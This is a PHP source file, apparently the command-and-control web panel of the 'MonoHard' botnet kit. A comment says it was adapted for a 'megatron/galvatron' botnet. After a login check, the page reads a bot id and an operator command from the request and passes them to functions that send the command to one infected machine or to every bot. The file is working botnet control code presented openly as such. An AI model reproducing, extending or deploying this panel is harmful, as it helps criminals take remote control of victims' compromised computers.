<?php
 /******************************************************************************************
           ____    ____                        ____  ____                       __  
          |_   \  /   _|                      |_   ||   _|                     |  ] 
            |   \/   |   .--.   _ .--.   .--.   | |__| |   ,--.   _ .--.   .--.| |  
            | |\  /| | / .'`\ \[ `.-. |/ .'`\ \ |  __  |  `'_\ : [ `/'`\]/ /'`\' |  
           _| |_\/_| |_| \__. | | | | || \__. |_| |  | |_ // | |, | |    | \__/  |  
          |_____||_____|'.__.' [___||__]'.__.'|____||____|\'-;__/[___]    '.__.;__] . .   .-.    . 
                                                                                    | |   |\|   '| 
                 By Carlos Ganoza || www.todoporelvicio.com                         `.'   `-' .  '
         ******************************************************************************************/
session_start();
if(!isset($_SESSION['sesion'])){
header("location:login.php?error=1");
}
//added by khr0x40sh for the "megatron/galvatron" botnet
echo '<html><head>
<script>
function toggleHelp()
{
	var disp = document.getElementById("help").style.display;
	if (disp == "none")
	{
		document.getElementById("help").style.display="table";
		
	}
	if (disp == "table")
	{
		document.getElementById("help").style.display="none";
	}
}
</script>
<!--<meta http-equiv="refresh" content="15">-->
</head>';

echo '<body><div id="boxes" class="boxes"><link href="stile.css" rel="stylesheet" type="text/css"/>
<div id="leftdiv" class="leftdiv"><!-- this will be a menu bar later --></div>
<div id="centraldiv" class="centraldiv"><p class="titulo">Galvatron</p>
<pre class="subtitulo">Powered by MonoHard</pre>';

$id=isset($_GET['id'])  ?  $_GET['id']   :  NULL;
$comando=isset($_POST['comando'])  ?  $_POST['comando']   :  NULL;
include('funct.php');
 ver('bot');
 
 if($id!=NULL)
{
 comando($id,$comando);
}
else
{
comandoall($comando);
}
echo '</div><div id="rightdiv" class="rightdiv"><p align="right" class="verhead"><span class="bar"><a href="logout.php">Close Session</a></p></div></div>';
?>
